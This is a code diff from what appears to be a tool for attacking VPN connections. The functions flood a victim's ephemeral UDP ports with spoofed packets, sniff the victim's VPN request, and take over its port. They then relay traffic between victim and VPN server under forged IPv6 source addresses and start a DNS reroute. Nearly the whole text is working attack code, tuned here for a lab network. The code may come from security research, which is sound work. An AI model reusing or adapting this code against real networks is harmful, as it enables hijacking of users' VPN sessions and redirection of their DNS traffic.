@@ -78,25 +78,24 @@ int tcp_bind_port(unsigned short tobind);
 
 void udp_fill_ephemeral_port_range() {
 #define PORT_RANGE_START 32768
-#define PORT_RANGE_END 61000
+#define PORT_RANGE_END  61000
+	// 32780
 	PacketSender sender;
-	NetworkInterface iface(public_iface);
+	NetworkInterface iface("tun-ipv6"); //public_iface);
 	std::cout << "Starting to fill ephemeral port space" << std::endl;
+	std::string attackerAddr = "fd00::1001";
 	while (udp_continue_ephem) {
 		for (unsigned short dport = PORT_RANGE_START;
 				dport < PORT_RANGE_END; dport++) {
-			IPv6 pkt = IPv6(victim_ip) / UDP(dport, vpn_port) / RawPDU("DEADBEEF");
+			IPv6 pkt = IPv6(victim_ip, attackerAddr) / UDP(dport, vpn_port) / RawPDU("DEADBEEF");
 			IPv6& ip = pkt.rfind_pdu<IPv6>();
 			ip.hop_limit(2);
 			UDP& udp = pkt.rfind_pdu<UDP>();
 			udp.dport(dport);
-			if (dport % 10001 == 0)
-				std::cout << "Sending packets" << std::endl;
-			sender.send(pkt); // , iface);
-			if (dport % 10001 == 0)
-				std::cout << "Sent packets" << std::endl;
+			sender.send(pkt, iface);
+			usleep(10);
 		}
-		usleep(10000000);
+		usleep(1000000);
 	}
 	std::cout<<"Victim Port Fill Complete\n";
 }
@@ -104,10 +103,15 @@ void udp_fill_ephemeral_port_range() {
 bool _sniff_vpn_request_handler(PDU &some_pdu) {
 //define IPPROTO_UDP 17
 
+	PacketSender sender;
+	// NetworkInterface iface("enp0s8");//public_iface);
+	NetworkInterface iface("tun-ipv6");//public_iface);
 	const IPv6 &ip = some_pdu.rfind_pdu<IPv6>();
+	const UDP &udp = some_pdu.rfind_pdu<UDP>();
+	const RawPDU& raw = udp.rfind_pdu<RawPDU>();
 	// std::cout<<"found packet with src IP: "<<ip.src_addr()<<"\n";
 	// std::cout<<ip.src_addr()<<" -> "<<ip.dst_addr()<<"\n";
-	if (ip.src_addr() == victim_ip) std::cout<<"packet from victim recd\n";
+	if (ip.src_addr() == victim_ip) std::cout << "packet from victim recd\n";
 	if (ip.src_addr() == victim_ip && ip.next_header() == IPPROTO_UDP) {
 		victim_port =
 			some_pdu.rfind_pdu<UDP>().sport();
@@ -117,7 +121,12 @@ bool _sniff_vpn_request_handler(PDU &some_pdu) {
 			udp_bind_port(victim_port);
 		}
 		udp_continue_ephem = false;
+		/* , "fd12:2345:6789:fe::fe"
+		IPv6 pkt = IPv6(vpn_ip, "fd12:2345:6789:fe::fe") /
+			UDP(vpn_port, victim_port) / raw;
+		sender.send(pkt, iface);
 		return false;
+		*/
 	}
 	return true;
 }
@@ -298,7 +307,8 @@ void sniff_tcp_handler() {
 
 bool relay_packet(PDU &some_pdu) {
 	PacketSender sender;
-	NetworkInterface iface(public_iface);
+	NetworkInterface iface("enp0s8");//public_iface);
+	NetworkInterface iface_tun("tun-ipv6");//public_iface);
 	
 	unsigned short vport;
 	const IPv6 &ip = some_pdu.rfind_pdu<IPv6>();
@@ -322,9 +332,12 @@ bool relay_packet(PDU &some_pdu) {
 					dns_reroute);
 			dns_reroute_thread.detach();
 		}
-		IPv6 pkt = IPv6(vpn_ip) /
+		// IPv6 pkt = IPv6(vpn_ip, "fd12:2345:6789:fe::fe") v5 deleted:
+		//IPv6 pkt = IPv6(vpn_ip) / // added: v5
+		IPv6 pkt = IPv6("fd00::2", "fd00::1001")/
 			UDP(vpn_port, victim_port) / raw;
-		sender.send(pkt);//, iface);
+		sender.send(pkt, iface_tun); //); // , iface); v4 no iface
+		// sender.send(pkt); // , iface);
 	}
 	else if (ip.src_addr() == vpn_ip &&
 			ip.dst_addr() == attacker_pub_ip &&
@@ -333,9 +346,10 @@ bool relay_packet(PDU &some_pdu) {
 			<< ip.src_addr() << ":" << udp.sport() 
 			<< ", dst=" << ip.dst_addr() << ":" 
 			<< udp.dport() << std::endl;
-		IPv6 pkt = IPv6(victim_ip) /
+		IPv6 pkt = IPv6(victim_ip, "fd00::1001") /
 			UDP(victim_port, vpn_port) / raw;
-		sender.send(pkt);//, iface);
+		//sender.send(pkt); // , iface);
+		sender.send(pkt, iface_tun);
 	} else {
 		if (udp.sport() == 53) {
 			std::cout << "Received something else: src="
